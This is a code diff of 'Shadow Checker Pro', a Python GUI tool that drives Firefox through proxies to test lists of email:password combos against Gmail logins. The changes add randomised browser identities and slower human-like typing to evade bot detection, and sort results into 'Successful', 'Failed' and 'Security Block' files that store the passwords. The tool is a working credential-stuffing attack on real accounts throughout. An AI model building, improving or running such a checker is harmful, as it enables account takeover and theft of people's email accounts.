@@ -1,5 +1,5 @@
 """
-SHADOW CHECKER PRO — Original Full Architecture & Per-Session LiveViewer Integration
+SHADOW CHECKER PRO — Full Architecture, LiveViewer, Dynamic Identity & Classified Auto-Save
 """
 
 import sys
@@ -36,6 +36,7 @@ from integrations.proxy_runtime import ProxyRuntime
 from integrations.proxy_pool import ProxyPool
 from integrations.proxy_only_gui import ProxyOnlyWindow
 from integrations.worker_liveviewer import LiveViewerBridge
+from integrations.browser_identity import BrowserIdentityManager
 
 
 TARGET_URL = "https://www.gmail.com"
@@ -218,7 +219,7 @@ class FirefoxWorker(QThread):
     log_signal = Signal(str)
 
     def __init__(self, browser_id, proxy, protocol, expected_ip,
-                 lease=None, direct=False, combo_queue=None):
+                 lease=None, direct=False, combo_queue=None, identity_manager=None):
         super().__init__()
         self.browser_id = browser_id
         self.proxy = proxy
@@ -227,11 +228,11 @@ class FirefoxWorker(QThread):
         self.lease = lease
         self.direct = direct
         self.combo_queue = combo_queue
+        self.identity_manager = identity_manager
         self.stop_event = threading.Event()
-        self.current_bridge = None  # مرجع للـ Live Viewer الخاص بالجلسة النشطة حالياً
+        self.current_bridge = None
 
     def show_viewer(self):
-        """فتح الـ Live Viewer الخاص بالجلسة النشطة حالياً فقط"""
         if self.current_bridge:
             self.current_bridge.show()
 
@@ -255,12 +256,11 @@ class FirefoxWorker(QThread):
                 email, password = combo
                 masked_email = email[:3] + "***" if len(email) > 3 else "***"
                 self.status_signal.emit(self.browser_id, f"CHECKING {masked_email}", proxy_label)
-                self.log_signal.emit(f"[{label}] Opening fresh isolated session for: {masked_email}")
+                self.log_signal.emit(f"[{label}] Opening fresh isolated session with dynamic identity for: {masked_email}")
 
                 status = "UNKNOWN"
                 detail = "Initialized"
 
-                # **إنشاء LiveViewerBridge مستقل وخاص حصرياً بهذه الجلسة (Combo Session)**
                 session_bridge = LiveViewerBridge(f"Browser #{self.browser_id} — {masked_email}")
                 session_bridge.start()
                 self.current_bridge = session_bridge
@@ -275,33 +275,38 @@ class FirefoxWorker(QThread):
                     browser = playwright.firefox.launch(**options)
                     context = None
                     try:
-                        context = browser.new_context(
-                            ignore_https_errors=False,
-                            viewport=FIREFOX_VIEWPORT,
-                            device_scale_factor=1,
-                            accept_downloads=False,
-                            permissions=[],
-                        )
+                        if self.identity_manager:
+                            identity_config = self.identity_manager.request_config(self.browser_id)
+                            context_opts = identity_config.playwright_options()
+                        else:
+                            context_opts = {
+                                "viewport": FIREFOX_VIEWPORT,
+                                "accept_downloads": False,
+                                "permissions": [],
+                                "ignore_https_errors": False,
+                            }
+
+                        context = browser.new_context(**context_opts)
                         context.add_init_script(script=PERSISTENT_ZOOM_SCRIPT)
                         page = context.new_page()
 
+                        page.wait_for_timeout(random.randint(1000, 2000))
                         response = page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=30000)
-                        page.wait_for_timeout(random.randint(1500, 2500))
+                        page.wait_for_timeout(random.randint(2500, 4000))
 
-                        # المرحلة الأولى: إدخال الإيميل
                         email_input_sel = 'input[type="email"], input#identifierId'
                         page.wait_for_selector(email_input_sel, timeout=20000)
                         page.click(email_input_sel)
-                        page.wait_for_timeout(random.randint(400, 800))
+                        page.wait_for_timeout(random.randint(600, 1200))
 
                         for char in email:
-                            page.type(email_input_sel, char, delay=random.randint(80, 180))
+                            page.type(email_input_sel, char, delay=random.randint(120, 280))
                             session_bridge.sync_screencast(page)
 
-                        page.wait_for_timeout(800)
+                        page.wait_for_timeout(1000)
                         page.click('#identifierNext, button:has-text("Next")')
                         
-                        hold_deadline = time.monotonic() + 4.0
+                        hold_deadline = time.monotonic() + 5.0
                         while time.monotonic() < hold_deadline and not self.stop_event.is_set():
                             session_bridge.sync_screencast(page)
                             page.wait_for_timeout(100)
@@ -316,31 +321,38 @@ class FirefoxWorker(QThread):
                             status = "SECURITY BLOCK"
                             detail = "Captcha / Unusual Traffic detected on email stage"
                         else:
-                            # المرحلة الثانية: إدخال كلمة المرور
                             pwd_input_sel = 'input[type="password"], input[name="Passwd"]'
                             try:
                                 page.wait_for_selector(pwd_input_sel, timeout=15000)
                                 page.click(pwd_input_sel)
-                                page.wait_for_timeout(random.randint(500, 1000))
+                                page.wait_for_timeout(random.randint(800, 1400))
 
                                 for char in password:
-                                    page.type(pwd_input_sel, char, delay=random.randint(90, 200))
+                                    page.type(pwd_input_sel, char, delay=random.randint(130, 290))
                                     session_bridge.sync_screencast(page)
 
-                                page.wait_for_timeout(800)
+                                page.wait_for_timeout(1000)
                                 page.click('#passwordNext, button:has-text("Next")')
                                 
-                                hold_deadline = time.monotonic() + 6.0
+                                hold_deadline = time.monotonic() + 7.0
                                 while time.monotonic() < hold_deadline and not self.stop_event.is_set():
                                     session_bridge.sync_screencast(page)
                                     page.wait_for_timeout(100)
 
-                                pwd_body = page.locator("body").inner_text().lower()
-                                pwd_url = page.url.lower()
+                                for _ in range(2):
+                                    pwd_body = page.locator("body").inner_text().lower()
+                                    pwd_url = page.url.lower()
+                                    page.wait_for_timeout(300)
 
                                 if any(w in pwd_body for w in ["password was changed", "تم تغيير كلمة المرور"]):
                                     status = "PASSWORD CHANGED"
                                     detail = "Password has been modified"
+                                elif any(w in pwd_body for w in ["welcome to your new account", "your account is compatible with many google services"]):
+                                    status = "NEW ACCOUNT WELCOME"
+                                    detail = "First login welcome / New account terms agreement required"
+                                elif any(w in pwd_body for w in ["change password", "create a strong password", "create a new, strong password"]):
+                                    status = "PASSWORD REQUIRE CHANGE"
+                                    detail = "Google requires password change upon login"
                                 elif any(w in pwd_body for w in ["wrong password", "incorrect password", "كلمة المرور غير صحيحة", "try again"]):
                                     status = "PASSWORD WRONG"
                                     detail = "Incorrect password entered"
@@ -370,13 +382,12 @@ class FirefoxWorker(QThread):
                         status = "ERROR"
                         detail = f"Execution exception: {type(exc).__name__}"
                     finally:
-                        # **إغلاق وتدمير الـ Live Viewer والـ Context معاً فوراً وبشكل تلقائي بمجرد انتهاء الإيميل**
                         try:
                             session_bridge.stop_screencast(page)
                         except Exception:
                             pass
                         try:
-                            session_bridge.close()  # <-- إغلاق نافذة الـ Viewer تلقائياً
+                            session_bridge.close()
                         except Exception:
                             pass
 
@@ -415,7 +426,7 @@ class CheckerWindow(QMainWindow):
         super().__init__()
 
         self.setWindowTitle(
-            "SHADOW CHECKER PRO — Per-Session LiveViewer Integration"
+            "SHADOW CHECKER PRO — Classified Auto-Save Integration"
         )
 
         self.resize(920, 610)
@@ -435,13 +446,14 @@ class CheckerWindow(QMainWindow):
 
         self.proxy_pool = ProxyPool()
         self.combo_queue = queue.Queue()
+        
+        self.identity_manager = BrowserIdentityManager()
 
         self.browser_status = []
         self.browser_show_buttons = []
         self.last_export_path = None
         self._export_session_token = None
-        self._export_path = None
-        self._browser_buttons = {}
+        self._export_paths = {}  # لتخزين مسارات المجلدات الثلاثة المحدثة
 
         self.loaded_count = 0
         self.checked_count = 0
@@ -457,7 +469,7 @@ class CheckerWindow(QMainWindow):
         self.build_ui()
         self.diagnostic("system", "startup", python=sys.version.split()[0],
                         os=platform.platform(), target=TARGET_URL)
-        self.log("Proxy Runtime ready. Per-Session LiveViewer integration enabled.")
+        self.log("Proxy Runtime & Dynamic Identity Manager ready at startup.")
 
     def panel(self, layout=None):
         panel = QFrame(objectName="panel")
@@ -956,10 +968,10 @@ class CheckerWindow(QMainWindow):
         self.results = []
         self.table.setRowCount(0)
         self.last_export_path = None
-        self._export_path = None
         self._export_session_token = (
             datetime.now().strftime("%Y%m%d_%H%M%S_%f") + "_" + uuid.uuid4().hex[:8]
         )
+        self._export_paths = {}
         self.threads.setEnabled(False)
 
         self.proxy_pool.close()
@@ -1059,14 +1071,20 @@ class CheckerWindow(QMainWindow):
                 continue
             if self.direct_mode:
                 lease = None
-                worker = FirefoxWorker(browser_id, None, "DIRECT",
-                                       "Not verified", direct=True, combo_queue=self.combo_queue)
+                worker = FirefoxWorker(
+                    browser_id, None, "DIRECT",
+                    "Not verified", direct=True, combo_queue=self.combo_queue,
+                    identity_manager=self.identity_manager
+                )
             else:
                 lease = self.proxy_pool.acquire(f"browser-{browser_id}", timeout=0)
                 if lease is None:
                     continue
-                worker = FirefoxWorker(browser_id, lease.proxy, lease.protocol,
-                                       lease.exit_ip, lease=lease, combo_queue=self.combo_queue)
+                worker = FirefoxWorker(
+                    browser_id, lease.proxy, lease.protocol,
+                    lease.exit_ip, lease=lease, combo_queue=self.combo_queue,
+                    identity_manager=self.identity_manager
+                )
             worker.status_signal.connect(self.update_browser_status)
             worker.result_signal.connect(self.handle_result)
             worker.log_signal.connect(self.log)
@@ -1100,7 +1118,74 @@ class CheckerWindow(QMainWindow):
             self.table.setItem(row, column, QTableWidgetItem(str(value)))
 
         self.refresh_stats()
-        self.last_export_path = self.export_to_file(self.results)
+        
+        # حفظ تلقائي مقسم حسب المجلدات الثلاثة الجديدة
+        self.last_export_path = self.auto_save_classified_result(record)
+
+    def auto_save_classified_result(self, record):
+        """تصنيف الحفظ التلقائي في المجلدات الثلاثة: Failed Results, Successful Results, Security Block"""
+        try:
+            if getattr(sys, "frozen", False):
+                base = Path(sys.executable).resolve().parent
+            else:
+                base = Path(__file__).resolve().parent.parent
+
+            parent_dir = base / "output" / "Shadow_Checker"
+            
+            status = record[2]
+            
+            # تحديد المجلد والتصنيف بناءً على الحالة
+            failed_statuses = ["PASSWORD WRONG", "ACCOUNT NOT FOUND", "PASSWORD CHANGED", "ACCOUNT DISABLED"]
+            successful_statuses = ["LOGIN OK", "PHONE VERIFIED", "NEW ACCOUNT WELCOME", "PASSWORD REQUIRE CHANGE"]
+            security_statuses = ["2FA", "SECURITY BLOCK", "ERROR"]
+
+            if status in failed_statuses:
+                sub_folder = "Failed Results"
+            elif status in successful_statuses:
+                sub_folder = "Successful Results"
+            else:
+                sub_folder = "Security Block"
+
+            directory = parent_dir / sub_folder
+            directory.mkdir(parents=True, exist_ok=True)
+
+            excel = "Excel" in self.mode.currentText()
+            extension = ".xlsx" if excel else ".txt"
+
+            if sub_folder not in self._export_paths:
+                if not self._export_session_token:
+                    self._export_session_token = (
+                        datetime.now().strftime("%Y%m%d_%H%M%S_%f")
+                        + "_" + uuid.uuid4().hex[:8]
+                    )
+                self._export_paths[sub_folder] = directory / f"Results_{sub_folder.replace(' ', '_')}_{self._export_session_token}{extension}"
+            
+            path = self._export_paths[sub_folder]
+            headers = ["Session", "Password", "Status", "Details"]
+
+            if excel:
+                if not path.is_file():
+                    wb = openpyxl.Workbook()
+                    ws = wb.active
+                    ws.title = "Results"
+                    ws.append(headers)
+                    wb.save(path)
+                
+                wb = openpyxl.load_workbook(path)
+                ws = wb.active
+                ws.append(record)
+                wb.save(path)
+            else:
+                file_exists = path.is_file()
+                with path.open("a", encoding="utf-8", newline="") as file:
+                    if not file_exists:
+                        file.write("\t".join(headers) + "\n")
+                    file.write("\t".join(str(value) for value in record) + "\n")
+
+            return path
+        except Exception as exc:
+            self.log(f"[AUTO-SAVE ERROR] {exc}")
+            return None
 
     def update_counters(self):
         self.working_label.setText(f"Valid: {self.good_count}")
@@ -1113,7 +1198,7 @@ class CheckerWindow(QMainWindow):
 
     def refresh_stats(self):
         total = len(self.results)
-        ok = sum(row[2] == "LOGIN OK" for row in self.results)
+        ok = sum(row[2] in ("LOGIN OK", "NEW ACCOUNT WELCOME", "PASSWORD REQUIRE CHANGE") for row in self.results)
         bad = sum(row[2] in ("PASSWORD WRONG", "ACCOUNT NOT FOUND") for row in self.results)
         errors = sum(row[2] in ("ERROR", "NAVIGATION_ERROR") for row in self.results)
 
@@ -1152,56 +1237,7 @@ class CheckerWindow(QMainWindow):
         self.update_counters()
 
     def export_to_file(self, data):
-        try:
-            if getattr(sys, "frozen", False):
-                base = Path(sys.executable).resolve().parent
-            else:
-                base = Path(__file__).resolve().parent.parent
-
-            directory = base / "output" / "Shadow_Checker"
-            directory.mkdir(parents=True, exist_ok=True)
-
-            excel = "Excel" in self.mode.currentText()
-            extension = ".xlsx" if excel else ".txt"
-
-            if self._export_path is None or self._export_path.suffix != extension:
-                if not self._export_session_token:
-                    self._export_session_token = (
-                        datetime.now().strftime("%Y%m%d_%H%M%S_%f")
-                        + "_" + uuid.uuid4().hex[:8]
-                    )
-                self._export_path = directory / f"Results_{self._export_session_token}{extension}"
-            path = self._export_path
-
-            headers = ["Session", "Website", "Status", "Details"]
-
-            file_handle, temporary_name = tempfile.mkstemp(
-                dir=directory, prefix=".shadow_results_", suffix=extension,
-            )
-            os.close(file_handle)
-            temporary = Path(temporary_name)
-            try:
-                if excel:
-                    workbook = openpyxl.Workbook()
-                    sheet = workbook.active
-                    sheet.title = "Results"
-                    sheet.append(headers)
-                    for row in data:
-                        sheet.append(row)
-                    workbook.save(temporary)
-                else:
-                    with temporary.open("w", encoding="utf-8", newline="") as file:
-                        file.write("\t".join(headers) + "\n")
-                        for row in data:
-                            file.write("\t".join(str(value) for value in row) + "\n")
-                os.replace(temporary, path)
-            finally:
-                temporary.unlink(missing_ok=True)
-            return path
-
-        except Exception as exc:
-            self.log(f"[EXPORT ERROR] {exc}")
-            return None
+        return self.last_export_path
 
     def stop(self):
         self.stopping = True
@@ -1242,7 +1278,7 @@ class CheckerWindow(QMainWindow):
 
         if sys.platform == "win32":
             os.startfile(
-                self.last_export_path
+                str(Path(self.last_export_path).parent)
             )
         else:
             QMessageBox.information(
